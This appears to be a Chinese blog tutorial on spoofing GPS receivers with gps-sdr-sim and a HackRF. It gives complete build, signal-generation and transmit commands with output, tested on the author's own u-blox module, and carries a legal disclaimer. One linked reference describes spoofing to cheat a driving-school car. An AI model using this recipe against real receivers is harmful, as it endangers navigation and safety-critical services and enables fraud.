
</br>

[TOC]

</br>

## 一、GPS 的工作原理

GPS 是全球定位系统的缩写，已伴随我们多年。它是第二次世界大战后由美国国防部开发的卫星无线电导航系统，其目的是确定地球上任何物体（人、车辆等）的位置，根据所用系统的版本和类型，其精度/误差程度也不同。

它通过至少 24 颗卫星组成的网络工作，这些卫星绕地球运行，高度约为 20,000 公里，轨道分布在 6 个不同的轨道平面上，相对于地球赤道平面的倾角约为 55º。

这种配置的目的是，在地球表面的任何一点（以及在任何高度），地平线以上 (OTH) 始终至少有 4 颗可见卫星。

![][p1]

GPS 系统及其基础设施的运行基于几个组件或部分：第一个是我们在前几段中刚刚看到的“空间部分”，同时还有另外两个部分，即控制部分和用户部分。控制组件基于分布在全球各地的 5 个地面跟踪站，并连接到一个称为MCS（主控制站）的中央控制站。该组件的任务是通过校准和同步时钟以及更新其轨道位置来跟踪卫星。

用户组件是链条中的最后一个环节，它基本上是我们用来在地球上定位自己的 GPS 设备，无论是手表、手机、GPS 手持设备、汽车导航仪、船舶和飞机定位等。

![][p2]

GPS 欺骗的客观构成是什么？基本上，它包括通过无线电发射我们想要取代真实信号的“虚假”GPS 坐标。为了实现这一点，我们将逻辑上依赖于发射功率和/或上述用户段中包含的接收器的接近度，以使其接收我们修改的信号而忽略真实信号，从而定位到我们想要的位置和/或路径/行程。

<font color=#FF000 size=6em> **非常重要!!! 在您继续阅读之前...**  </font>

> 此时，在继续之前，请允许我给您一个非常重要的免责声明，并且我们必须始终明确：在任何情况下，在没有事先明确的法律授权的情况下，广播任何类型的无线电信号都是完全禁止的，并且是应受法律惩处的犯罪行为。

> 本文的目的和其中展示的技术的唯一目的是传播技术，为此，正如本文后面将看到的那样，我们采用了必要的解决方案和资源，以免将任何公开广播纳入无线电公共领域（也称为无线电空间）。

> 全球定位系统 (GPS) 越来越多地用于各种关键应用和服务。这些包括海上和空中导航、公用事业、电信、银行和计算机行业的时间同步，以及许多公共安全服务，例如警察、消防，以及更大程度上的紧急救援和救护服务。

> 请让我们意识到这一关键性，让我们都负责任并对此表示最大的尊重。

</br>

## 二、动手实验
### 2.1 GPS-SDR-SIM 软件下载
在本篇文章中，我们要依靠的主要“魔法”是 GPS-SDR-SIM 软件，它是日本 Takuji Ebinuma 的创作，它是一种在 GPS 使用频段生成数据流的软件，然后可以使用软件定义的无线电设备 (SDR)（例如 ADALM-Pluto、BladeRF、HackRF 和 USRP）将其转换为 RF。

我们采用 linux 系统会简单点，首先将工程 clone 下来：

```
git clone git@github.com:osqzss/gps-sdr-sim.git
```

用下面命令编译出可执行程序：

```
gcc gpssim.c -lm -O3 -o gps-sdr-sim
```

其用法如下：

```
Usage: gps-sdr-sim [options]
Options:
  -e <gps_nav>     RINEX navigation file for GPS ephemerides (required)
  -u <user_motion> User motion file in ECEF x, y, z format (dynamic mode)
  -x <user_motion> User motion file in lat, lon, height format (dynamic mode)
  -g <nmea_gga>    NMEA GGA stream (dynamic mode)
  -c <location>    ECEF X,Y,Z in meters (static mode) e.g. 3967283.15,1022538.18,4872414.48
  -l <location>    Lat,Lon,Hgt (static mode) e.g. 30.286502,120.032669,100
  -L <wnslf,dn,dtslf> User leap future event in GPS week number, day number, next leap second e.g. 2347,3,19
  -t <date,time>   Scenario start time YYYY/MM/DD,hh:mm:ss
  -T <date,time>   Overwrite TOC and TOE to scenario start time
  -d <duration>    Duration [sec] (dynamic mode max: 300 static mode max: 86400)
  -o <output>      I/Q sampling data file (default: gpssim.bin ; use - for stdout)
  -s <frequency>   Sampling frequency [Hz] (default: 2600000)
  -b <iq_bits>     I/Q data format [1/8/16] (default: 16)
  -i               Disable ionospheric delay for spacecraft scenario
  -p [fixed_gain]  Disable path loss and hold power level constant
  -v               Show details about simulated channels
```

<br>

### 2.2 GPS 广播星历文件获取

为了生成必要的信号，该软件需要通过 GPS 发射星历文件获取 GPS 卫星星座。

每日 GPS 广播星历文件 ( brdc ) 是各个站点的导航文件融合成单个文件；这种类型的文件对于生成上述伪距和所见 GPS 卫星的模拟多普勒是必不可少的。然后，该模拟范围数据用于生成要从 HackRF 广播的 GPS 信号的数字化 I/Q 样本。

我在哪里可以得到这些 GPS 星历文件？ NASA 在这方面为我们提供了帮助，几乎每天都在 `https://cddis.nasa.gov/archive/gnss/data/daily/2024/brdc/` 上提供给我们（我们需要先在 NASA 上注册个账号，比较简单）。

![][p3]

下载带 n 的最后一个压缩包 `brdc2310.24n.gz`，解压后形成 `brdc2310.24n`。

</br>

### 2.3 生成动态或静态 HackRF IQ 样本

然后可以使用下面命令中的一个，来生成动态或静态 hackrf 数字化样本数据（静态和动态是指 GPS 点是运动的还是静止的）


命令 | 介绍
---|---
gps-sdr-sim -e brdc2310.24n -b 8 -u circle.csv | User motion file in ECEF x, y, z format (dynamic mode)
gps-sdr-sim -e brdc2310.24n -b 8 -x circle_llh.csv | User motion file in lat, lon, height format (dynamic mode)</br>纬度、经度、高度，动态 GPS 数据，表格的第一列是 0.1S（注意：实测发现 111米/S 的速度 ublox 可以识别，也就是说：每 0.1S 的纬度增加不要超过 .0001）
gps-sdr-sim -e brdc2310.24n -b 8 -g triumphv3.txt | NMEA GGA stream (dynamic mode)
gps-sdr-sim -e brdc2310.24n -b 8 -l 30.286502,120.032669,100 | Lat,Lon,Hgt (static mode) e.g. 30.286502,120.032669,100</br>纬度、经度、高度，静态 GPS 数据


</br>

运行命令的效果如下：

```
➜  gps-sdr-sim git:(master) ✗ ./gps-sdr-sim -e brdc2310.24n -b 8 -l 30.286502,120.032669,100 
Using static location mode.
xyz =  -2758918.6,   4772301.1,   3197889.4
llh =   30.286502,  120.032669,       100.0
Start time = 2024/08/18,00:00:00 (2328:0)
Duration = 300.0 [sec]
04   52.3  17.1  24036077.4  13.1
05  229.3  16.3  24050077.6  11.2
06   17.0  54.4  21184858.2   6.3
09   85.4  37.0  22225688.5   8.5
11  306.2  42.9  21855821.8   7.1
12  297.5  27.9  22817718.2   9.0
14  170.3   2.4  25405331.8  16.7
17  124.8  46.9  21691260.5   7.1
20  244.6  44.5  21790345.6   6.9
22  185.6  20.6  23577925.9  11.1
25  320.6   4.3  25084127.6  13.6
Time into run = 300.0
Done!
Process time = 28.2 [sec]
```

最终生成 IQ 文件：gpssim.bin（时间总共是模拟 300s 的数据，采用 8bit 编码，大小总共 1.5G）
PS：其 readme 文档介绍了针对非 hackrf 平台的用法，如果是其他平台，可以参考生成对应 IQ 文件。

</br>

### 2.4 发送进行 GPS 欺诈

有了 IQ 数据，之后直接可以调用 hackrf 的工具进行发送：

```
➜  gps-sdr-sim git:(master) ✗ hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0
call hackrf_set_sample_rate(2600000 Hz/2.600 MHz)
call hackrf_set_hw_sync_mode(0)
call hackrf_set_freq(1575420000 Hz/1575.420 MHz)
call hackrf_set_amp_enable(1)
Stop with Ctrl-C
 5.0 MiB / 1.000 sec =  5.0 MiB/second, average power -13.1 dBfs
 5.2 MiB / 1.000 sec =  5.2 MiB/second, average power -13.1 dBfs
 5.2 MiB / 1.000 sec =  5.2 MiB/second, average power -13.1 dBfs
 5.2 MiB / 1.000 sec =  5.2 MiB/second, average power -13.1 dBfs
 5.2 MiB / 1.000 sec =  5.2 MiB/second, average power -13.1 dBfs
 5.2 MiB / 1.000 sec =  5.2 MiB/second, average power -13.1 dBfs
....
将会持续 300S
```

其中：
- -t 必须是我们刚刚使用 gps-sdr-sim 生成的 .bin 文件
- -f 是发射频率（以 Hz 为单位）（我们必须将其调整为 1.575Ghz，这是 GPS 的使用频率）
- -s 调整采样率
- -a 值 1 以激活 HackRF 的 RX/TX 放大器
- -x 能够将 TX VGA 增益从 0 调整到 47 dB（对我个人而言）最好的结果始终是将其保留为零），太大会对周围造成影响，千万别调大。

</br>

### 2.5 GPS 欺诈效果观察
#### 2.5.1 欺诈对象

我本来想要使用 GPS_Test.apk 在手机上试试是否能实现欺诈，实际发现我的三星 note9 不行。同时研究发现很多人也遇到类似问题：

[《终于！我成功欺骗了我的 GPS 接收器和低端 Android 手机，但需要帮助！ #332》][#10]    
> 也许你可以分享更多细节，例如：我用 0.5ppm 晶体替换了 plutosdr 晶体，我使用 U-blox 8 获得了 3d 修复，使用静态模式，但在 iphone 14 上不起作用
> 我可以使用 HackRF 接收器通过任何 ublox 接收器获得 3D 修复，但这个库似乎不再适用于智能手机。可能是由于智能手机设备的固件升级或添加了其他传感器。

[《使用 HackRF 和 Android 设备进行 gps-sdr-sim 故障排除/教程 #305(详细)》][#11]
> 我有三部安卓手机：redmi4（android6.0）、redmi6（android8.0）、三星s10（android12），只有android6.0可以修复gps，其他的可以查看卫星但不能修复它们。

</br>

于是，我寻找到几乎是十年前的 GPS 模块：ublox 的 `NEO-6M-0-001`，安装其串口驱动后，通过 USB 将其连接到电脑上，启动 `u-center v8.10`，效果如下：

![][p4]

</br>

#### 2.5.2 静态坐标欺诈

此时，用 gps-sdr-sim 使用巴黎的坐标，生成 IQ 文件，然后再使用 hackrf_transfer 发送：

```
./gps-sdr-sim -e brdc2310.24n -b 8 -l 48.87372,2.29363,100
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0
```

大概在发送之后的 30S 左右，会看到 3D fix 并定位到巴黎：

![][p5]


下面是一些城市的经纬度，可以试试：

城市 | 纬度 经度
---|---
土耳其 | 39	35	
东京 | 35.6937632	139.7036319
巴黎 | 48.87372	2.29363
迈阿密 | 34.05593	-80.22713
洛杉矶 | 35.000605965	-118.24437
上海 | 31.18331	121.43657
北京 | 39.90071	116.39213
大理 | 25.59157	100.22998


</br>

#### 2.5.3 动态坐标（轨迹）欺诈

当我们使用动态坐标生成 IQ 数据，并使用 hackrf 发送时，将会产生动态坐标欺诈的效果：

```
./gps-sdr-sim -e brdc2310.24n -b 8 -x circle_llh.csv 
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0
```

当 3D fix 之后，你会发现 UBLOX 被欺骗认为自己在日本的某个地方正在以 8m/s 的速度运动：

![][p6]


</br>

## 参考链接

[[1]. GITHUB —— multi-sdr-gps-sim][#1]    
[[2]. GPS Spoofing with HackRF from Windows environments（详细，教程）][#2]    
[[3]. ublox 官网][#3]    
[[4]. 如何安装 u-center 在 Ubuntu 上并将 GNSS 接收器连接到它][#4]    
[[5]. HackRF实现GPS欺骗教程（细教程）][#5]    
[[6]. hackrf GPS欺骗（和上面类似）][#6]    
[[7]. 利用Hackrf One进行GPS定位欺骗制作超级跑马机（实践教程，欺骗教练车）][#7]    
[[8]. GPS-SDR-SIM 不适用于实时运行。对于 HackRF，请尝试 multi-sdr-gps-sim][#8]     
[[9]. multi-sdr-gps-sim][#9]    
[[10]. 终于！我成功欺骗了我的 GPS 接收器和低端 Android 手机，但需要帮助！ #332][#10]    
[[11]. 使用 HackRF 和 Android 设备进行 gps-sdr-sim 故障排除/教程 #305(详细)][#11]
[[12]. 关于 GPS 欺骗的问题（用处不大的讨论，信息很杂）][#12]    
[[13]. GNSS SDR 显示 GPS-SDR 模拟信号经度值不正确（我没出现）][#13]    
[[14]. 使用 GNSS SDR sim 演示欺骗（问答很简单，用处不大）][#14]    
[[15]. GPS 模拟(讨论杂，基本覆盖常见问题)][#15]    
[[16]. 6GSPACELab - 卢森堡大学（不相关)][#16]    
[[17]. The Comprehensive GNU Radio Archive Network（不相关）][#17]    
[[18]. Window下Pothos SDR开发环境搭建][#18]    
[[19]. 追星技 GNSS-SDR 使用 LimeSDR 实收 GPS 信号][#19]    
[[20]. 手把手搭建4G基站-利用 LIMESDR MINI 搭建 OAI 核心网][#20]    
[[21]. BLE物理层的开源SDR实现][#21]    


</br>


[#1]:https://github.com/Mictronics/multi-sdr-gps-sim
[#2]:https://www.hackerdecabecera.com/2020/06/gps-spoofing-with-hackrf-from-windows.html
[#3]:https://www.u-blox.com/en
[#4]:https://www.ardusimple.cn/how-to-use-ardusimple-kit-and-u-center-in-ubuntu/
[#5]:https://www.cnblogs.com/k1two2/p/5164172.html
[#6]:https://www.cnblogs.com/A66666/p/12365319.html
[#7]:https://www.cnblogs.com/k1two2/p/6387701.html
[#8]:https://github.com/osqzss/gps-sdr-sim/issues/363
[#9]:https://github.com/Mictronics/multi-sdr-gps-sim
[#10]:https://github.com/osqzss/gps-sdr-sim/issues/332
[#11]:https://github.com/osqzss/gps-sdr-sim/issues/305
[#12]:https://www.reddit.com/r/hackrf/comments/vcj0im/question_about_gps_spoofing/
[#13]:https://stackoverflow.com/questions/58494992/gnss-sdr-shows-incorrect-longitude-value-from-gps-sdr-sim-signal
[#14]:https://stackoverflow.com/questions/54771251/demonstrate-spoofing-with-gnss-sdr-sim
[#15]:https://nuand.com/forums/viewtopic.php?t=3860
[#16]:https://6gspacelab.uni.lu/en/research-testbeds/ntn-over-the-satellite
[#17]:https://www.cgran.org/
[#18]:https://limesdr.wordpress.com/2018/06/14/window%e4%b8%8b%e5%ae%89%e8%a3%85limesdr-mini%e5%bc%80%e5%8f%91%e7%8e%af%e5%a2%83-pothos-sdr%e5%bc%80%e5%8f%91%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/
[#19]:https://zhuanlan.zhihu.com/p/337940838
[#20]:https://xiaolimars.wordpress.com/2019/02/04/limesdrmini-with-oai/
[#21]:https://jiangwei.org/2017/01/30/blesdr/




[p1]:https://tuchuang.beautifulzzzz.com:3000/?path=202408/output.gif
[p2]:https://tuchuang.beautifulzzzz.com:3000/?path=202408/segmentsGPS.png
[p3]:https://tuchuang.beautifulzzzz.com:3000/?path=202408/gps_brdc_data.png
[p4]:https://tuchuang.beautifulzzzz.com:3000/?path=202408/ublox1.gif
[p5]:https://tuchuang.beautifulzzzz.com:3000/?path=202408/gps_cheef_ublox.png
[p6]:https://tuchuang.beautifulzzzz.com:3000/?path=202408/gps_cheef_ublox_dyn.png


